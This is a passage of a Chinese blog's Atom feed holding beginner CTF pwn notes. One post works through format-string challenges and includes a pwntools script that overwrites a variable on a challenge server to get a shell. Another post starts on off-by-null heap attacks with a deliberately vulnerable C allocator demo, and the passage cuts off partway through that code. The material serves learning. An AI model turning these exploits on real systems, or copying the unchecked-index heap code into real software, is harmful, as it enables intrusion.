class=&#34;line&#34;&gt;  char s; // [esp+0h] [ebp-68h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_895F980(&amp;quot;please input the way you want go&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __libc_read(0, &amp;amp;s, 96);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_puts(&amp;amp;s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return sub_80488E7(&amp;amp;s, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;一个char为什么能占据那么多栈空间???&lt;/p&gt;
&lt;p&gt;应该是有很多路径,可以根据&amp;#x2F;bin&amp;#x2F;sh回溯吧?&lt;/p&gt;
&lt;p&gt;是的…一点点回溯就可以找到&lt;/p&gt;
&lt;p&gt;845542A -&amp;gt; 816c3f7-&amp;gt;8091787-&amp;gt;805ac47 -&amp;gt;804d177-&amp;gt;8049ae7-&amp;gt;8048cd7-&amp;gt;8048977-&amp;gt;80488e7-&amp;gt;main&lt;/p&gt;
&lt;p&gt;p32(87)+p32(83)+p32(68)+p32(87)+p32(65)+p32(65)+p32(87)+p32(68)+p32(87)&lt;/p&gt;
&lt;p&gt;878368876565876887&lt;/p&gt;
&lt;p&gt;WSDWAAWDW(这个就是答案)&lt;/p&gt;
&lt;p&gt;为什么87变成0x38了 56了&lt;/p&gt;
&lt;p&gt;0x80488fd  movzx eax, byte ptr [eax]&lt;/p&gt;
&lt;h2 id=&#34;pwn8&#34;&gt;&lt;a href=&#34;#pwn8&#34; class=&#34;headerlink&#34; title=&#34;pwn8&#34;&gt;&lt;/a&gt;&lt;strong&gt;pwn8&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;格式化字符串,修改内存值即可&lt;/p&gt;
&lt;p&gt;修改0x80EBF9C处的值为28&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int sub_80488CE()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int result; // eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char v1; // [esp+0h] [ebp-68h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_804F9B0(&amp;quot;please input what you want say&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __libc_read(0, &amp;amp;v1, 96);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_804F9B0(&amp;amp;v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if ( dword_80EBF9C == 28 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = sub_804F6B0(&amp;quot;/bin/sh&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = sub_804F9B0(&amp;quot;the key is %d %d&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;









&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;quot;%28d&amp;quot; + b&amp;quot;A&amp;quot; * (0x90 - len(b&amp;quot;%28d&amp;quot;)) + p32(0x80EBF9C)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&amp;quot;101.43.247.245&amp;quot;,9207)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &amp;quot;debug&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&amp;#x27;tmux&amp;#x27;, &amp;#x27;splitw&amp;#x27;, &amp;#x27;-h&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(sh,&amp;quot;b *0x008048987&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#payload = b&amp;quot;%28d&amp;quot; + b&amp;quot;A&amp;quot; * (0x90 - len(b&amp;quot;%28d&amp;quot;)) + p32(0x80EBF9C)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = fmtstr_payload(4,&amp;#123;0x80EBF9C:28&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;











&lt;h2 id=&#34;pwn9&#34;&gt;&lt;a href=&#34;#pwn9&#34; class=&#34;headerlink&#34; title=&#34;pwn9&#34;&gt;&lt;/a&gt;&lt;strong&gt;pwn9&lt;/strong&gt;&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int sub_8048945()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char v1; // [esp+0h] [ebp-1B8h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char v2; // [esp+150h] [ebp-68h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_puts(&amp;quot;please input your username&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __libc_read(0, &amp;amp;v2, 32);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_puts(&amp;quot;please input your passwd&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __libc_read(0, &amp;amp;v1, 335);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return sub_80488E7(&amp;amp;v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;不存在溢出&lt;/p&gt;
&lt;p&gt;后面函数是往一个地址写数据..有什么用呢?&lt;/p&gt;
&lt;p&gt;有后们函数,所以应该是要覆盖字符串,或者说字符串复制&lt;/p&gt;
&lt;p&gt;0x08048948 覆盖为 0x80488CE(system)&lt;/p&gt;
&lt;p&gt;第一次写入要覆盖的地址,第二次覆盖&lt;/p&gt;
&lt;h1 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;回头有时间可以自己编译一下符号&lt;/p&gt;
&lt;p&gt;​	这样其实有问题,不太对,因为ebp那里的值其实是不确定的,但总是会往前指,或多或少,有时候正好指到shellcode开头或者偏移一点点,至于为什么呢…可以后面在研究&lt;/p&gt;
&lt;p&gt;哪个都行, 不过有一个问题就是,这个值会是固定的嘛…&lt;/p&gt;
&lt;p&gt;plt的过程再熟悉下&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-06-03T08:18:00.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/</id>
        <title>pwn入门-29-off—by-one</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/"/>
        <content type="html">&lt;p&gt;总的感觉就是通过off by null来修改size区域,然后造成堆块合并,使得堆块重叠,可以修改可控堆块,&lt;/p&gt;
&lt;p&gt;主要看了一个这里面的例子:&lt;a href=&#34;https://www.jianshu.com/p/8eb55c40ec4a&#34;&gt;https://www.jianshu.com/p/8eb55c40ec4a&lt;/a&gt; 还有权威指南的pwn书&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/shellphish/how2heap/blob/master/glibc_2.23/poison_null_byte.c&#34;&gt;https://github.com/shellphish/how2heap/blob/master/glibc_2.23/poison_null_byte.c&lt;/a&gt; how2heap的例子也不错&lt;/p&gt;
&lt;p&gt;demo&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;assert.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *ptr[&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1.malloc&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;2.edit&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;3.show&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;4.free&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;5.exit&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;my_malloc&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; index,size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;index);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;size:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ptr[index] = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;content:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,ptr[index],size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;my_edit&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; index,size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;index);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;size:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;content:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,ptr[index],size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;my_free&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; index;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;index);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(ptr[index]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;my_show&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; index;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;index);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(ptr[index]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setbuf(&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setbuf(&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span 